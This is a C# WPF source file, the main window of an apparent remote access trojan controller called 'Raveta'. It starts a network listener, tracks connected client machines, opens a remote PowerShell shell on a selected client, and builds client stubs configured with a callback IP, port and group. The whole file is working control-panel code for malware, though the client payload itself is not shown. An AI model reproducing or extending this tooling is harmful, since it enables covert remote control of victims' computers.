using System;
using System.Activities;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Interop;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using Raveta;
using System.ComponentModel;
using System.Threading;
using System.Text.RegularExpressions;

namespace Raveta
{

    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
	{
		private static BackgroundWorker ConnectionWorker;

		[DllImport("user32.dll")]
		internal static extern int SetWindowCompositionAttribute(IntPtr hwnd, ref AeroGlass.AeroGlass.WindowCompositionAttributeData data);

		private void DoWork(object sender, DoWorkEventArgs e)
		{
			while (true)
			{
				ConnectionWorker.ReportProgress(0);
				Thread.Sleep(1);
			}
		}

		private void ProgressChanged(object sender, ProgressChangedEventArgs e)
		{
			ClientRemoved clientRemoved = Server.__ClientRemoved();
			if (clientRemoved.Removed)
            {
				Connections.Items.RemoveAt(clientRemoved.i);
				Server._ClientRemoved = false;
				Server._RemovedClientIdx = -1;

			}

			ClientAccepted clientAccepted = Server.NewClientAccepted();
			if (clientAccepted.Accepted)
			{
				Connections.Items.Add(clientAccepted.clientData.DataObject);
				Server._NewClientAccepted = false;

			}
		}
		public MainWindow()
		{
			InitializeComponent();

			Task.Run(() => Server.Loop());
			Task.Run(() => Server.AddConnectionPolls());

			ConnectionWorker = new BackgroundWorker
			{
				WorkerReportsProgress = true,
				WorkerSupportsCancellation = true
			};

			ConnectionWorker.DoWork += DoWork;
			ConnectionWorker.ProgressChanged += ProgressChanged;
			ConnectionWorker.RunWorkerAsync();
		}

		private void Window_Loaded(object sender, RoutedEventArgs e)
		{
			EnableBlur();
		}

		internal void EnableBlur()
		{
			var windowHelper = new WindowInteropHelper(this);

			var accent = new AeroGlass.AeroGlass.AccentPolicy();
			accent.AccentState = AeroGlass.AeroGlass.AccentState.ACCENT_ENABLE_BLURBEHIND;

			var accentStructSize = Marshal.SizeOf(accent);

			var accentPtr = Marshal.AllocHGlobal(accentStructSize);
			Marshal.StructureToPtr(accent, accentPtr, false);

			var data = new AeroGlass.AeroGlass.WindowCompositionAttributeData();
			data.Attribute = AeroGlass.AeroGlass.WindowCompositionAttribute.WCA_ACCENT_POLICY;
			data.SizeOfData = accentStructSize;
			data.Data = accentPtr;

			SetWindowCompositionAttribute(windowHelper.Handle, ref data);

			Marshal.FreeHGlobal(accentPtr);
		}
		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int wMsg, int wParam, int lParam);
		[DllImport("user32.dll")]
		public static extern int ReleaseCapture();

		private void StackPanel_MouseDown(object sender, MouseButtonEventArgs e)
        {
			ReleaseCapture();
			Window window = Window.GetWindow(this);
			var wih = new WindowInteropHelper(window);
			IntPtr hWnd = wih.Handle;
			SendMessage(hWnd, 0x112, 0xf012, 0);
		}

        private void AddHost_Copy_Click(object sender, RoutedEventArgs e)
        {
			if (!Server.Active)
			{
				Server.StartServer(Port.Text);
				AddHost_Copy.Content = "Stop Listener";
				Server.Active = true;
			}
			else
			{
				Server.DisposeListener();
				AddHost_Copy.Content = "Start Listener";
				Server.Active = false;
			}
        }

		private void ReconnectClientClick(object sender, RoutedEventArgs e)
		{
			if (Connections.SelectedItem != null && !(Connections.SelectedIndex >= Server.ClientList.Count))
			{
				if (  Server.ClientList.ElementAt(Connections.SelectedIndex).Client != null)
				{
					Server._RemovedClientIdx = Connections.SelectedIndex;
					Server.ClientList.ElementAt(Connections.SelectedIndex).Client.Close();
					Server.ClientList.RemoveAt(Connections.SelectedIndex);
				}

				Connections.Items.Remove(Connections.SelectedItem);
			}

		}
		private void RemoteShellClick(object sender, RoutedEventArgs e)
		{
			if (Connections.SelectedItem != null && !(Connections.SelectedIndex >= Server.ClientList.Count))
			{
				if (Server.ClientList.ElementAt(Connections.SelectedIndex).Client != null)
				{
					Powershell powershell = new Powershell();
					powershell.Show();
				}

			}

		}
		
		private void NumberValidationPort(object sender, TextCompositionEventArgs e)
		{
			Regex regex = new Regex("[^0-9]+");
			e.Handled = regex.IsMatch(e.Text);
		}
		private void NumberValidationIP(object sender, TextCompositionEventArgs e)
		{
			Regex regex = new Regex("[^.0-9]+");
			e.Handled = regex.IsMatch(e.Text);
		}

        private void Build_Click(object sender, RoutedEventArgs e)
        {
			Builder builder = new Builder();
			BuilderData builderData = new BuilderData();
			builderData.IP = _IPAddress.Text;
			builderData.Port = _Port.Text;
			builderData.Group = _Group.Text;
			builder.builderData = builderData;
			builder.Build();
		}
    }
}
